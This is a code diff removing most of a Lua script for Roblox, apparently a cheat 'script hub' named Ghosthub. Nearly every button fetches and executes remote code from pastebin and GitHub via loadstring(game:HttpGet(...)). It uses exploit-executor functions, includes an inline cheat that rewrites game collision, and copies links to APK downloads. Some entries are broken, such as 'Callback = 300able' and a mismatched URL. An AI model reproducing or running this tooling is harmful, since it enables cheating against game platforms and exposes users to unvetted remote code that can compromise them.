- GameHubButton.Text = name
- GameHubButton.TextScaled = true
- GameHubButton.TextSize = 8 
- GameHubButton.TextWrapped = true
-
- GameHubButton.MouseButton1Click:connect(function()
- loadstring(script)()
- end)
- GameHubSlotNum += 1
- GameHubPosX += 0.15
- if GameHubSlotNum == 6 then
-    GameHubSlotNum = 0
-    GameHubPosX = 0.03
-    GameHubPosZ += 0.09
- end
-end
-
-AddGameHubButton("Natural Disaster","loadstring(game:HttpGet('https://pastebin.com/raw/JnGNjU0X'))()")
-AddGameHubButton("Pass The Bomb","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Pass%20The%20Bomb.txt'))()")
-AddGameHubButton("Workout Island","loadstring(game:HttpGet('https://pastebin.com/raw/FuXAcGAd'))()")
-AddGameHubButton("Blood Moon Tycoon","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Blood%20Moon%20Tycoon'))()")
-AddGameHubButton("Andy's Musical Chairs","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Musical%20Chairs'))()")
-AddGameHubButton("Homework Lifting Simulator","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Home%20Work%20Lifting%20Simulator'))()")
-AddGameHubButton("The Clown Killings Reborn","loadstring(game:HttpGet('https://pastebin.com/raw/JN55hK5h'))()")
-AddGameHubButton("Murder Mystery","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Murder%20Mystery'))()")
-AddGameHubButton("Tower Of Jump","loadstring(game:HttpGet('https://pastebin.com/raw/sPmNjBNu'))()")
-AddGameHubButton("Cars Trading","loadstring(game:HttpGet('https://pastebin.com/raw/vhNFzwzE'))()")
-AddGameHubButton("Knife Ability Test","loadstring(game:HttpGet('https://pastebin.com/raw/TDBuxW7W'))()")
-AddGameHubButton("Boss Fighting Simulator","loadstring(game:HttpGet('https://pastebin.com/raw/LcEW9UYh'))()")
-AddGameHubButton("Gym Training Simulator","loadstring(game:HttpGet('https://pastebin.com/raw/5zhThedn'))()")
-AddGameHubButton("Clone Tycoon 2","loadstring(game:HttpGet('https://pastebin.com/raw/JSCs82QY'))()")
-AddGameHubButton("Survive And Kill The Killers Area51","loadstring(game:HttpGet('https://pastebin.com/raw/TtdvYAKU'))()")
-AddGameHubButton("Happy Runner","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Happy%20Runners'))()")
-AddGameHubButton("Swordman Simulator","loadstring(game:HttpGet('https://pastebin.com/raw/QcF6Xetq'))()")
-AddGameHubButton("The Underground War","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/The%20UnderGround%20War'))()")
-AddGameHubButton("Weapon Simulator 2",'if game.PlaceId == 6191637341 then   loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Weapon%20Simulator%202"))() else local function Callback(answer)    if answer == "Join" then       game:GetService("TeleportService"):Teleport(6191637341)    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("The Underground War 2","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/The%20UnderGround%20War%202'))()")
-AddGameHubButton("Build A Boat For Treassure","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Build%20A%20Boat%20For%20Treasure'))()")
-AddGameHubButton("Color Block Race","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Color%20Block%20Race'))()")
-AddGameHubButton("Color Block Tower","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Collor%20Block%20Tower'))()")
-AddGameHubButton("Math Race","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Math%20Race.txt'))()")
-AddGameHubButton("Bee Swarm Simulator","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Math%20Race.txt'))()")
-AddGameHubButton("Big Brain Simulator","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Big%20Brain%20Simulator'))()")
-AddGameHubButton("Answer Or Die","loadstring(game:HttpGet('https://raw.githubusercontent.com/jaeelin/S-Ware/main/Answer%20or%20Die'))()")
-AddGameHubButton("Impossible Glass Bridge Obby",'if game.PlaceId == 7952502098 then for i,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do   if v:IsA("BasePart") and v.CanCollide == false then       v.CanCollide = true       v.Color = Color3.fromRGB(255, 0, 0)   end end spawn(function()   while true do       task.wait() for i,v in pairs(game:GetService("Workspace")["Glass Bridge"].GlassPane:GetDescendants()) do   if v:IsA("TouchTransmitter") then       v:Destroy()   end end end end) else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(7952502098)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = 300able}) end')
-AddGameHubButton("Burp Simulator","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Burp%20Simulator'))()")
-AddGameHubButton("Climb 1000 Stairs",'if game.PlaceId == 5702593762 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Climb%201k%20Stairs"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(5702593762)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Castle Wars",'if game.PlaceId == 5059952999 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Castle%20Wars"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(5059952999) elseif answer == "No" then end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Mega Hide And Seek",'if game.PlaceId == 5708035517 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Mega%20Hide%20And%20Seek"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(5708035517)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Rise A Yipee",'if game.PlaceId == 9742783208 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Rise%20A%20Yippee"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(9742783208)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Speed Run Simulator",'if game.PlaceId == 7047488135 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Speed%20Run%20Simulator"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(7047488135)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Tower Of Madness",'if game.PlaceId == 6470944645 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Tower%20Of%20Madness"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(6470944645)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Victory Jump",'if game.PlaceId == 10379662529 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Victory%20Jump"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(10379662529)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Cheese Escape",'if game.PlaceId == 5777099015 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Cheese%20Escape"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(5777099015)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Survive The Killer",'loadstring(game:HttpGet("https://raw.githubusercontent.com/Milan08Studio/ChairWare/main/main.lua"))()')
-AddGameHubButton("Stairs Of Rage",'loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Stairs%20Of%20Rage"))()')
-AddGameHubButton("Evade",'loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Evade"))()')
-AddGameHubButton("Hide And Seek Extreme",'if game.PlaceId == 205224386 then loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Hide%20And%20Seek%20Extreme"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(205224386)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Dreaming Simulator",'loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Dreaming%20Simulator"))()')
-AddGameHubButton("Ragdoll Engine",'local credits = "SystemBroken made by system_calix" loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()')
-AddGameHubButton("Math Answer Or Die",'if game.PlaceId == 12398414727 then loadstring(game:HttpGet("https://raw.githubusercontent.com/jaeelin/S-Ware/main/Math%20Answer%20or%20Die"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(12398414727)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Ramen Simulator",'if game.PlaceId == 4961974633 then loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Ramen%20Simulator"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(4961974633)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Legends Of Speed",'if game.PlaceId == 3101667897 then loadstring(game:HttpGet("https://pastebin.com/raw/mqGPg69N"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(3101667897)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Banana Eats",'if game.PlaceId == 4448566543 then loadstring(game:HttpGet("https://gist.githubusercontent.com/NovaVanity/131e258977e50e1ec0184c72818b8bfd/raw", true))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(4448566543)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("The Floor Is Lava",'if game.PlaceId == 815405518 then loadstring(game:HttpGet("https://pastebin.com/raw/XRVVXkJj"))() else local function Callback(answer)    if answer == "Join" then game:GetService("TeleportService"):Teleport(815405518)    elseif answer == "No" then    end end local Bindable = Instance.new("BindableFunction") Bindable.OnInvoke = Callback game.StarterGui:SetCore("SendNotification", {    Title = "GhostPlayer";    Text = "This Script is not Allowed in this game do you want to teleport in the game script?";    Duration = "300";    Button1 = "Join";    Button2 = "No";    Callback = Bindable}) end')
-AddGameHubButton("Guess How Many","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Guess%20How%20Many'))()")
-AddGameHubButton("Logo Quiz","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Logo%20Quiz'))()")
-AddGameHubButton("Find The Button","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Find%20The%20Button'))()")
-AddGameHubButton("Collect The Body","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Collect%20The%20Body'))()")
-AddGameHubButton("Hide And Seek Props Hunt","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Hide%20And%20Seek%20Props%20Hunt'))()")
-AddGameHubButton("Every Second You Get +1 Points","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Every%20Second%20You%20Get%20%2B1%20Points'))()")
-AddGameHubButton("Egg Empire","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Egg%20Empire'))()")
-AddGameHubButton("Find The Code 2","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Find%20the%20code%202'))()")
-AddGameHubButton("Crown Divers","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Crown%20Divers'))()")
-AddGameHubButton("Survive Flight 871","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Survive%20Flight%20871'))()")
-AddGameHubButton("Letter Scramble!","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Letter%20Scramble'))()")
-AddGameHubButton("Gem Connect","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Gem%20Connect'))()")
-AddGameHubButton("Math Boxing","loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Math%20Boxing'))()")
-AddGameHubButton("Doors But Math","loadstring(game:HttpGet('https://pastebin.com/raw/tqcbu8pp'))()")
-AddGameHubButton("MM2 Duels","loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/MM2%20Duels'))()")
----
-
-
-
-
-
-
-
-
-
-
----Credits Frame Buttons
-Image.Parent = FrameCredits
-Image.BackgroundColor3 = Color3.new(0,0,0)
-Image.BackgroundTransparency = 0
-Image.Size = UDim2.new(0.3,0,0.6)
-Image.BorderColor3 = Color3.new(1,1,1)
-Image.BorderSizePixel = 1
-Image.Position = UDim2.new(0.03,0,0.06)
-Image.Image = "rbxassetid://14196845260"
-
-Credits1.Parent = FrameCredits
-Credits1.BackgroundColor3 = Color3.new(0,0,0)
-Credits1.BackgroundTransparency = 0
-Credits1.BorderSizePixel = 1
-Credits1.BorderColor3 = Color3.new(1,1,1)
-Credits1.Position = UDim2.new(0.03,0,0.76)
-Credits1.TextColor3 = Color3.new(1,1,1)
-Credits1.Size = UDim2.new(0.17,0,0.14)
-Credits1.Font = Enum.Font.Merriweather
-Credits1.FontSize = Enum.FontSize.Size14
-Credits1.Text = "My Profile"
-Credits1.TextScaled = false
-Credits1.TextSize = 14
-Credits1.TextWrapped = true
-
-Credits2.Parent = FrameCredits
-Credits2.BackgroundColor3 = Color3.new(0,0,0)
-Credits2.BackgroundTransparency = 0
-Credits2.BorderSizePixel = 1
-Credits2.BorderColor3 = Color3.new(1,1,1)
-Credits2.Position = UDim2.new(0.22,0,0.76)
-Credits2.TextColor3 = Color3.new(1,1,1)
-Credits2.Size = UDim2.new(0.17,0,0.14)
-Credits2.Font = Enum.Font.Merriweather
-Credits2.FontSize = Enum.FontSize.Size14
-Credits2.Text = "My Group"
-Credits2.TextScaled = false
-Credits2.TextSize = 14
-Credits2.TextWrapped = true
-
-Credits3.Parent = FrameCredits
-Credits3.BackgroundColor3 = Color3.new(0,0,0)
-Credits3.BackgroundTransparency = 0
-Credits3.BorderSizePixel = 1
-Credits3.BorderColor3 = Color3.new(1,1,1)
-Credits3.Position = UDim2.new(0.41,0,0.76)
-Credits3.TextColor3 = Color3.new(1,1,1)
-Credits3.Size = UDim2.new(0.17,0,0.14)
-Credits3.Font = Enum.Font.Merriweather
-Credits3.FontSize = Enum.FontSize.Size14
-Credits3.Text = "My Discord"
-Credits3.TextScaled = false
-Credits3.TextSize = 14
-Credits3.TextWrapped = true
-
-Credits4.Parent = FrameCredits
-Credits4.BackgroundColor3 = Color3.new(0,0,0)
-Credits4.BackgroundTransparency = 0
-Credits4.BorderSizePixel = 1
-Credits4.BorderColor3 = Color3.new(1,1,1)
-Credits4.Position = UDim2.new(0.6,0,0.76)
-Credits4.TextColor3 = Color3.new(1,1,1)
-Credits4.Size = UDim2.new(0.17,0,0.14)
-Credits4.Font = Enum.Font.Merriweather
-Credits4.FontSize = Enum.FontSize.Size14
-Credits4.Text = "My Apps"
-Credits4.TextScaled = false
-Credits4.TextSize = 14
-Credits4.TextWrapped = true
-
-Credits5.Parent = FrameCredits
-Credits5.BackgroundColor3 = Color3.new(0,0,0)
-Credits5.BackgroundTransparency = 0
-Credits5.BorderSizePixel = 1
-Credits5.BorderColor3 = Color3.new(1,1,1)
-Credits5.Position = UDim2.new(0.79,0,0.76)
-Credits5.TextColor3 = Color3.new(1,1,1)
-Credits5.Size = UDim2.new(0.17,0,0.14)
-Credits5.Font = Enum.Font.Merriweather
-Credits5.FontSize = Enum.FontSize.Size14
-Credits5.Text = "My Channel"
-Credits5.TextScaled = false
-Credits5.TextSize = 14
-Credits5.TextWrapped = true
-
-Information.Parent = FrameCredits
-Information.BackgroundColor3 = Color3.new(0,0,0)
-Information.BackgroundTransparency = 1
-Information.BorderColor3 = Color3.new(1,1,1)
-Information.BorderSizePixel = 0
-Information.Position = UDim2.new(0.37,0,0.09)
-Information.TextColor3 = Color3.new(1,1,1)
-Information.Size = UDim2.new(0.6,0,0.5)
-Information.Font = Enum.Font.Merriweather
-Information.FontSize = Enum.FontSize.Size14
-Information.Text = "Gui Created By Ghostplayer, This Gui Created On August 16 2022 its Spend 3 to 4 days before publishing this script its have alot of Features from ghostplayer and Other Scripters Hope you guys Enjoyed to use this script, Click the Buttons Below for more Details"
-Information.TextScaled = false
-Information.TextSize = 13
-Information.TextWrapped = true
----
-
-
-
----Information Buttons Function
-local Image1 = "rbxassetid://14196845260"
-local Image2 = "rbxassetid://14196847158"
-local Image3 = "rbxassetid://14209734898"
-local Image4 = "rbxassetid://9939435592"
-local Image5 = "rbxassetid://9588320159"
-local Image6 = "rbxassetid://17722125795"
-local Image7 = "rbxassetid://17722203547"
-local Image8 = "rbxassetid://17722287235"
-local Image9 = "rbxassetid://17722330723"
-local Image10 = "rbxassetid://17722360682"
-local Image11 = "rbxassetid://17722376730"
-local Image12 = "rbxassetid://17722410204"
-local Image13 = "rbxassetid://17722447244"
-local Image14 = "rbxassetid://17722469621"
-ImageNum = 1
-
-Image.MouseButton1Click:connect(function()
-ImageNum += 1
-if ImageNum == 15 then
-   ImageNum = 1
-end
-
-if ImageNum == 1 then
-   Image.Image = Image1
-end
-if ImageNum == 2 then
-   Image.Image = Image2
-end
-if ImageNum == 3 then
-   Image.Image = Image3
-end
-if ImageNum == 4 then
-   Image.Image = Image4
-end
-if ImageNum == 5 then
-   Image.Image = Image5
-end
-if ImageNum == 6 then
-   Image.Image = Image6
-end
-if ImageNum == 7 then
-   Image.Image = Image7
-end
-if ImageNum == 8 then
-   Image.Image = Image8
-end
-if ImageNum == 9 then
-   Image.Image = Image9
-end
-if ImageNum == 10 then
-   Image.Image = Image10
-end
-if ImageNum == 11 then
-   Image.Image = Image11
-end
-if ImageNum == 12 then
-   Image.Image = Image12
-end
-if ImageNum == 13 then
-   Image.Image = Image13
-end
-if ImageNum == 14 then
-   Image.Image = Image14
-end
-end)
-
-Credits1.MouseButton1Click:connect(function()
-setclipboard("https://web.roblox.com/users/991052486/profile")
-RequestMessage("Script","Link Copied")
-end)
-
-Credits2.MouseButton1Click:connect(function()
-setclipboard("https://web.roblox.com/groups/10370956/Pro-Gammers-Club#!/about")
-RequestMessage("Script","Link Copied")
-end)
-
-Credits3.MouseButton1Click:connect(function()
-setclipboard("https://discord.gg/zWUNmJUh")
-RequestMessage("Script","Link Copied")
-end)
-
-Credits4.MouseButton1Click:connect(function()
-RequestMessage("Script","Link Copied")
-setclipboard("https://www.mediafire.com/file/cxqnl6y09slb6at/Ghosthub_More.apk/file")
-wait()
-setclipboard("https://www.mediafire.com/file/mjyg28n1k5m2dgz/Roblox_Scripts.apk/file")
-end)
-
-Credits5.MouseButton1Click:connect(function()
-RequestMessage("Script","Link Copied")
-setclipboard("https://youtube.com/channel/UChbZk_X9wQ_Xgh5GdL04TEA?si=12aeUt6PFF3e318M")
-end)
----
-
-
-
-
-
-
----Detect if the executor support get a file
-local FileScriptSupported = false
-local FileScript, IsSupported = pcall(function()
-makefolder("Ghosthub") --make folder to detect the executor support the filescript
-end)
-
-if FileScript then
-  FileScriptSupported = true
-else
-  FileScriptSupported = false
-end
----
-
-
-
-
----Add Favorite Function
-local function AddToFavorite(scriptId)
- local favorites = {}
- if not isfile("Ghosthub/Favorites.json") then
-    if not favorites.Favorites then
-       favorites["Favorites"] = {}
-       favorites["Current_Script_ID"] = 0
-    end
-    writefile("Ghosthub/Favorites.json", game.HttpService:JSONEncode(favorites))
- end
- 
- favorites = game.HttpService:JSONDecode(readfile("Ghosthub/Favorites.json"))
- local favoriteId = 1
- 
- for key, value in pairs(favorites.Favorites) do
-   if key then
-      favoriteId += 1
-   end
- end
- 
- if favoriteId == 25 or favoriteId >= 25 then
-    RequestMessage("Script" ,"Your Favorites" ,"Storage Are Full!")
-    return
- end
- 
- favoriteId = favorites["Current_Script_ID"] + 1
- 
- favorites["Current_Script_ID"] = favoriteId
- favorites.Favorites["Script"..favoriteId] = {
-   ["Script_ID"] = scriptId
- }
-
- writefile("Ghosthub/Favorites.json", game.HttpService:JSONEncode(favorites))
-end
----
-
-
-
-
-
----Request More Script Button Click
-function RequestClickMoreScriptButton(scriptname, script, description, userid, username, date, id, isPined, favoriteId)
- local ScreenGui1 = Instance.new("ScreenGui") 
- ScreenGui1.Parent = game.Players.LocalPlayer.PlayerGui
-
- local Frame1 = Instance.new("Frame") 
- Frame1.Parent = ScreenGui1
- Frame1.BackgroundColor3 = Color3.fromRGB(17,17,17)
- Frame1.BackgroundTransparency = 0.5
- Frame1.Position = UDim2.new(-0.5,0,-0.5)
- Frame1.Size = UDim2.new(1.5,0,1.5)
- Frame1.Active = true
- Frame1.Draggable = false
-
- local Frame2 = Instance.new("Frame") 
- Frame2.Parent = Frame1
- Frame2.BackgroundColor3 = Color3.fromRGB(17,17,17)
- Frame2.BackgroundTransparency = 0
- Frame2.BorderSizePixel = 1
- Frame2.BorderColor3 = Color3.fromRGB(242,243,243)
- Frame2.Position = UDim2.new(0.49,0,0.38)
- Frame2.Size = UDim2.new(0.35,0,0.5)
-
- local ImageButton1 = Instance.new("ImageButton") 
- ImageButton1.Parent = Frame2
- ImageButton1.BackgroundTransparency = 0
- ImageButton1.BackgroundColor3 = Color3.new(1,1,1)
- ImageButton1.BorderSizePixel = 1
- ImageButton1.BorderColor3 = Color3.new(0,0,0)
- ImageButton1.Position = UDim2.new(0.01,0,0.01)
- ImageButton1.Size = UDim2.new(0.3,0,0.4)
- ImageButton1.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-
- ImageButton1.MouseButton1Click:Connect(function()
- if ImageButton1.Image == game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420) then
-    ImageButton1.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
- else
-    ImageButton1.Image = game.Players:GetUserThumbnailAsync(userid, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
- end
- end)
- 
- local DateTextLabel = Instance.new("TextLabel")
- DateTextLabel.Parent = Frame2
- DateTextLabel.BackgroundColor3 = Color3.new(0,0,0)
- DateTextLabel.BackgroundTransparency = 1
- DateTextLabel.Position = UDim2.new(0.01,0,0.43)
- DateTextLabel.TextColor3 = Color3.new(1,1,1)
- DateTextLabel.Size = UDim2.new(0.3,0,0.3)
- DateTextLabel.Font = Enum.Font.Merriweather
- DateTextLabel.FontSize = Enum.FontSize.Size14
- DateTextLabel.Text = "Publisher\
-\
-Publish Date:\
-"..date
- DateTextLabel.TextYAlignment = Enum.TextYAlignment.Top
- DateTextLabel.TextScaled = false
- DateTextLabel.TextSize = 14
- DateTextLabel.TextWrapped = true
- 
- local TextLabel1 = Instance.new("TextBox") 
- TextLabel1.Parent = Frame2
- TextLabel1.BackgroundColor3 = Color3.fromRGB(17,17,17)
- TextLabel1.BackgroundTransparency = 1
- TextLabel1.Position = UDim2.new(0.38,0,0.01)
- TextLabel1.Size = UDim2.new(0.61,0,0.8)
- TextLabel1.Font = Enum.Font.SourceSans
- TextLabel1.TextColor3 = Color3.fromRGB(242,243,243)
- TextLabel1.MultiLine = true
- TextLabel1.ClearTextOnFocus = false
- TextLabel1.Text = "Script: "..scriptname.."\
-Uploader: "..username.."\
-User ID: "..userid.."\
-\
-Description:\
-"..description
- TextLabel1.TextSize = 20
- TextLabel1.TextScaled = false
- TextLabel1.TextWrapped = true
- TextLabel1.TextXAlignment = Enum.TextXAlignment.Left
- TextLabel1.TextYAlignment = Enum.TextYAlignment.Top
-
- local Text = TextLabel1.Text
- TextLabel1.Changed:Connect(function()
- TextLabel1.Text = Text
- end)
-
- local TextButton1 = Instance.new("TextButton") 
- TextButton1.Parent = Frame2
- TextButton1.BackgroundColor3 = Color3.fromRGB(17,17,17)
- TextButton1.BackgroundTransparency = 0
- TextButton1.BorderSizePixel = 1
- TextButton1.BorderColor3 = Color3.fromRGB(242,243,243)
- TextButton1.Position = UDim2.new(0.78,0,0.85)
- TextButton1.Size = UDim2.new(0.2,0,0.1)
- TextButton1.Font = Enum.Font.Merriweather
- TextButton1.TextColor3 = Color3.fromRGB(242,243,243)
- TextButton1.Text = "Execute"
- TextButton1.TextSize = 18
- TextButton1.TextScaled = false
- TextButton1.TextWrapped = true
-
- TextButton1.MouseButton1Click:Connect(function()
- ScreenGui1:Destroy()
- loadstring(script)()
- end)
-
- local TextButton2 = Instance.new("TextButton") 
- TextButton2.Parent = Frame2
- TextButton2.BackgroundColor3 = Color3.fromRGB(17,17,17)
- TextButton2.BackgroundTransparency = 0
- TextButton2.BorderSizePixel = 1
- TextButton2.BorderColor3 = Color3.fromRGB(242,243,243)
- TextButton2.Position = UDim2.new(0.55,0,0.85)
- TextButton2.Size = UDim2.new(0.2,0,0.1)
- TextButton2.Font = Enum.Font.Merriweather
- TextButton2.TextColor3 = Color3.fromRGB(242,243,243)
- TextButton2.Text = "Cancel"
- TextButton2.TextSize = 18
- TextButton2.TextScaled = false
- TextButton2.TextWrapped = true
-
- TextButton2.MouseButton1Click:Connect(function()
- ScreenGui1:Destroy()
- end)
- 
- if FileScriptSupported == true and id ~= 1 then
-    local TextButton3 = Instance.new("TextButton") 
-    TextButton3.Parent = Frame2
-    TextButton3.BackgroundColor3 = Color3.fromRGB(17,17,17)
-    TextButton3.BackgroundTransparency = 0
-    TextButton3.BorderSizePixel = 1
